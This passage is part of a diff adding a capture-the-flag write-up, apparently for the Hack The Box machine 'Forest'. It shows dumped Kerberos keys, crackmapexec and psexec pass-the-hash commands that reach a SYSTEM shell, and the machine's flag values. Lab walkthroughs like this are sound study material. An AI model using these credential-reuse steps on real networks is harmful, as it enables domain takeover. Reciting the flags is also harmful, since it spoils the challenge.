+  htb.local<span class="se">\l</span>ucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
+  htb.local<span class="se">\l</span>ucinda:des-cbc-md5:a13bb56bd043a2ce
+  htb.local<span class="se">\s</span>vc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
+  htb.local<span class="se">\s</span>vc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
+  htb.local<span class="se">\s</span>vc-alfresco:des-cbc-md5:014ac86d0b98294a
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
+  htb.local<span class="se">\A</span>dministrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac92
+  63bc913
+  htb.local<span class="se">\A</span>dministrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
+  htb.local<span class="se">\A</span>dministrator:des-cbc-md5:c1e049c71f57343b
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>We will use <strong><em>crackmapexec</em></strong> to check if our password works or not. To do that run:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ➜  ~ crackmapexec smb 10.10.10.161 <span class="nt">-u</span> administrator <span class="nt">-H</span> aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+  SMB         10.10.10.161    445    FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:FOREST<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+  SMB         10.10.10.161    445    FOREST           <span class="o">[</span>+] htb.local<span class="se">\a</span>dministrator:32693b11e6aa90eb43d32c72a07ceea6 <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div>    </div>
+
+    <p><img src="/assets/img/HTB/Forest_crackmapexec.png" alt="crackmapexec" /></p>
+  </li>
+  <li>
+    <p>We use psexec to connect to the machine using the Administrator account</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ➜  examples python3 psexec.py <span class="nt">-hashes</span> aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
+  Impacket v0.11.0 - Copyright 2023 Fortra
+    
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.161.....
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file IyDArZJa.exe
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.161.....
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service gqIn on 10.10.10.161.....
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service gqIn.....
+  <span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+  Microsoft Windows <span class="o">[</span>Version 10.0.14393]
+  <span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.
+    
+  C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
+  </span>nt authority<span class="se">\s</span>ystem
+    
+  C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; 
+    
+</code></pre></div>    </div>
+  </li>
+  <li>Flags:
+    <ul>
+      <li>User:</li>
+    </ul>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mi">70</span><span class="n">dd19fb034a1173f2aacf11983ed9ba</span>
+</code></pre></div>    </div>
+
+    <ul>
+      <li>Administrator/root:</li>
+    </ul>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">d301343242dc120827abc722dc0630f3</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+        </section>
+
+        <footer>
+        
+          This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.
+        </footer>
+
+      </div>
+    </div>
+  </body>
+</html>
